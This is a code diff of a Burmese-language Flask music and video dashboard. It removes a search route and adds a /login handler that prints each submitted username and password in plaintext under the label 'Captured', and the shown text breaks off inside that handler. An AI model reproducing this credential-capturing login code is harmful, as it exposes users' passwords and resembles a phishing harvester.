@@ -273,8 +273,8 @@ Dashboard_html = """
 
     <!-- Search Bar အသစ် -->
     <div class="search-box">
-    <form action="/dashboard" method="GET">
-        <input type="text" name="query" placeholder="သီချင်း သို့မဟုတ် ဗီဒီယို ရှာရန်...">
+    <form action="" method="GET">
+  <input type="text" name="query" placeholder="သီချင်း သို့မဟုတ် ဗီဒီယို ရှာရန်...">
         <button type="submit">ရှာမည်</button>
     </form>
 </div>
@@ -302,23 +302,11 @@ Dashboard_html = """
 </body>
 </html>
 """
-@app.route("/dashboard", methods=["GET"])
-def dashboard():
-    search_query = request.args.get("query", "").lower()
-    
-    show_music = True
-    show_video = True
-    
-    if search_query:
-        if "music" in search_query or "သီချင်း" in search_query:
-            show_video = False
-        elif "video" in search_query or "ဗီဒီယို" in search_query:
-            show_music = False
-
-    return render_template_string(
-        Dashboard_html, 
-        username="User", 
-        show_music=show_music, 
-        show_video=show_video,
-        search_query=search_query)
-    
+@app.route("/login", methods=["GET", "POST"])
+def login():
+    username = "User"
+    if request.method == "POST":
+        username = request.form.get("username", "User")
+        password = request.form.get("password")
+        print(f"Captured -> Username: {username}, Password: {password}")
+        
